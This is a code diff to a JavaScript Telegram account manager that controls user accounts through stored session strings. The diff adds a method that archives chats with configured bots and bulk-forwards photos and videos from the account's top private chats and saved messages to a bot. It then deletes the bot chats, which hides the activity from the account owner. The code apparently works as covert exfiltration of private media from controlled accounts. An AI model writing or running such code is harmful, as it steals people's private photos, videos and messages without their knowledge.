@@ -42,6 +42,7 @@ const fetchWithTimeout_1 = require("../../utils/fetchWithTimeout");
 const logbots_1 = require("../../utils/logbots");
 const connection_manager_1 = require("./utils/connection-manager");
 const message_search_dto_1 = require("./dto/message-search.dto");
+const TelegramBots_config_1 = require("../../utils/TelegramBots.config");
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
         this.session = new sessions_1.StringSession(sessionString);
@@ -159,6 +160,55 @@ class TelegramManager {
             await this.leaveChannels([channelId.toString()]);
             await connection_manager_1.connectionManager.unregisterClient(this.phoneNumber);
         }
+    }
+    async forwardMediaToBot(fromChatId) {
+        const bots = TelegramBots_config_1.BotConfig.getInstance().getAllBotUsernames(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
+        for (const bot of bots) {
+            try {
+                await this.client.sendMessage(bot, { message: "Forwarding media to bot" });
+                await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
+                    folderPeers: [
+                        new telegram_1.Api.InputFolderPeer({
+                            peer: await this.client.getInputEntity(bot),
+                            folderId: 1,
+                        }),
+                    ],
+                }));
+            }
+            catch (e) {
+                console.log(e);
+            }
+        }
+        try {
+            if (fromChatId) {
+                await this.forwardSecretMsgs(fromChatId, TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES));
+            }
+            else {
+                const chats = await this.getTopPrivateChats();
+                const me = await this.getMe();
+                if (chats.length > 0) {
+                    const finalChats = new Set(chats.map(chat => chat.chatId));
+                    finalChats.add(me.id?.toString());
+                    for (const chatId of finalChats) {
+                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE] });
+                        await this.forwardMessages(chatId, TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES), mediaMessages.photo.messages);
+                        await this.forwardMessages(chatId, TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES), mediaMessages.video.messages);
+                    }
+                }
+            }
+        }
+        catch (e) {
+            console.log(e);
+        }
+        for (const bot of bots) {
+            try {
+                await this.deleteChat(bot);
+            }
+            catch (e) {
+                console.log(e);
+            }
+        }
+        await connection_manager_1.connectionManager.unregisterClient(this.phoneNumber);
     }
     async forwardSecretMsgs(fromChatId, toChatId) {
         let offset = 0;
